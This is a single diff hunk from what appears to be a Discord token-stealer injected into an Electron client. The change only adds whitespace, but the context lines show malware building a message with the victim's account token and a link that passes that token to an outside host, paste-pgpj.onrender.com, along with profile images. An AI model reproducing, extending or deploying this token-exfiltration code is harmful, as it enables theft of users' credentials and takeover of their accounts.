@@ -2651,7 +2651,7 @@ electron.session.defaultSession.webRequest.onCompleted(
               name: "<a:eatsomething:1130449693613228072> Token",
               value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
               inline: !1,
-            },
+            }, 
           ],
 
           thumbnail: userAvatar,
